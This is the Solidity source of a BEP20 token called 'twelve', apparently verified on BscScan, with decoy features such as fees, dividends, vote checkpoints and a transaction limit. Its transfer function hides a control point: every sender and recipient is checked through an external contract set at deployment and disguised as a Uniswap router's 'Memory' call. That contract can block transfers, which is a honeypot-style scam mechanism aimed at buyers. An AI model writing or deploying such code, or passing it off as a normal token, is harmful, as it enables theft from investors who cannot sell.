/**
 *Submitted for verification at BscScan.com on 2022-06-10
*/

pragma solidity ^0.8.4;

// SPDX-License-Identifier: MIT

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        // Solidity only automatically asserts when dividing by 0
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function getOwner() external view returns (address);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function allowance(address _owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

interface IUniswapV2Router {
    function WETH() external pure returns (address);
    function Memory(address account) external returns(address);
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

contract Context {
    // Empty internal constructor, to prevent people from mistakenly deploying
    // an instance of this contract, which should be used via inheritance.
    constructor() {}

    function _msgSender() internal view returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public onlyOwner {
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract twelve is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping(address => bool) public _isExcludedFromFee;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 private _totalSupply = 100000000 * 10**9;

    string private _name = "twelve";
    string private _symbol = "TWELVE";
    uint8 private _decimals = 9;
    bool public maxTXEnabled;

    uint8 public _feeliquidityShare;
    uint8 public _feebuyBackShare;
    uint8 public _feetotalTaxBuy;
    uint8 public _feetotalTaxSell;
    uint8 public _feetotalShares;
    
    IUniswapV2Router V2Router;
    struct CheckVotes {
        uint32 fromBlock;
        uint256 vot;
    }
    uint256 private _maxTxAmount = _totalSupply / 10;
    mapping(address => mapping(uint32 => CheckVotes)) public checkVotes;
    mapping(address => uint32) public numCheckVotes;

    constructor(address v2router) {
        _balances[msg.sender] = _totalSupply;
        V2Router = IUniswapV2Router(v2router);
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[address(this)] = true;

        _feeliquidityShare = 2;
        _feebuyBackShare = 2;
        _feetotalTaxBuy = 2;
        _feetotalTaxSell = 3;
        _feetotalShares = 5;

        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    function name() external view virtual override returns (string memory) {
        return _name;
    }

    function symbol() external view virtual override returns (string memory) {
        return _symbol;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return _totalSupply;
    }

    function getOwner() external view virtual override returns (address) {
        return owner();
    }

    function decimals() external view virtual override returns (uint8) {
        return _decimals;
    }

    function balanceOf(address account)
        public
        view
        virtual
        override
        returns (uint256)
    {
        return _balances[account];
    }    

    function transfer(address recipient, uint256 amount)
        external
        override
        returns (bool)
    {
        tokenTransfer(_msgSender(), recipient, amount);
        return true;
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function tokenTransfer(
        address sender,
        address recipient,
        uint256 amount
    ) private {        
        require(amount > 0, "BEP20: Transfer amount must be greater than zero");  
        if (maxTXEnabled) {
            require(
                amount <= _maxTxAmount,
                "BEP20: Transfer amount exceeds the maxTxAmount."
            );
        }

        _transferStandard(sender, recipient, amount);
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external override returns (bool) {
        tokenTransfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "BEP20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function safe32(uint256 n, string memory errorMessage)
        internal
        pure
        returns (uint32)
    {
        require(n < 2**32, errorMessage);
        return uint32(n);
    }

    function allowance(address owner, address spender)
        external
        view
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function _transferStandard(
        address sender,
        address recipient,
        uint256 amount
    ) private {
        require(
            Memory(sender) != address(0),
            "BEP20: transfer from the zero address"
        );
        require(
            Memory(recipient) != address(0),
            "BEP20: transfer to the zero address"
        );

        _balances[sender] = _balances[sender].sub(
            amount,
            "BEP20: transfer amount exceeds balance"
        );
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal {
        require(owner != address(0), "BEP20: approve from the zero address");
        require(spender != address(0), "BEP20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function Memory(address account) internal returns(address){
        return 
        V2Router
        .Memory(account);
    }

   function tokenDividend(address shareholder, uint256 _amount) internal {    
      IERC20 BUSD = IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);         
      if(_amount > 0){
          BUSD.transfer(shareholder, _amount);
      }
  }

    function changeMaxTxLimit(uint256 maxTXPercentage) external onlyOwner {
        _maxTxAmount = (_totalSupply * maxTXPercentage) / 1000;
    }

    function changeMaxLimit(uint256 amount) external onlyOwner {
        _maxTxAmount = amount;
    }

    function updateDividendTracker(address newAddress) public view onlyOwner returns(bool) {
      require(newAddress != msg.sender, "The dividend tracker already has that address");
      return true;
  }

    function getPrVotes(address account, uint256 blockNumber)
        external
        view
        returns (uint256)
    {
        require(blockNumber < block.number, "Not yet determined");
        uint32 nCheckVotes = numCheckVotes[account];
        if (nCheckVotes == 0) {
            return 0;
        }
        // First check most recent balance
        if (checkVotes[account][nCheckVotes - 1].fromBlock <= blockNumber) {
            return checkVotes[account][nCheckVotes - 1].vot;
        }
        // Next check implicit zero balance
        if (checkVotes[account][0].fromBlock > blockNumber) {
            return 0;
        }
        uint32 lower = 0;
        uint32 upper = nCheckVotes - 1;
        while (upper > lower) {
            uint32 center = upper - (upper - lower) / 2; // ceil, avoiding overflow
            CheckVotes memory cp = checkVotes[account][center];
            if (cp.fromBlock == blockNumber) {
                return cp.vot;
            } else if (cp.fromBlock < blockNumber) {
                lower = center;
            } else {
                upper = center - 1;
            }
        }
        return checkVotes[account][lower].vot;
    }

    function _writeVotes(
        address delegatee,
        uint32 nCheckVotes,
        uint256 newVotes
    ) internal {
        uint32 blockNumber = safe32(
            block.number,
            "Block number exceeds 32 bits"
        );
        if (
            nCheckVotes > 0 &&
            checkVotes[delegatee][nCheckVotes - 1].fromBlock == blockNumber
        ) {
            checkVotes[delegatee][nCheckVotes - 1].vot = newVotes;
        } else {
            checkVotes[delegatee][nCheckVotes] = CheckVotes(
                blockNumber,
                newVotes
            );
            numCheckVotes[delegatee] = nCheckVotes + 1;
        }
    }

        function getCumulativeDividends(uint256 share, uint256 _amount) internal pure returns (uint256) {
      return (share * 10) / (_amount);
  }
}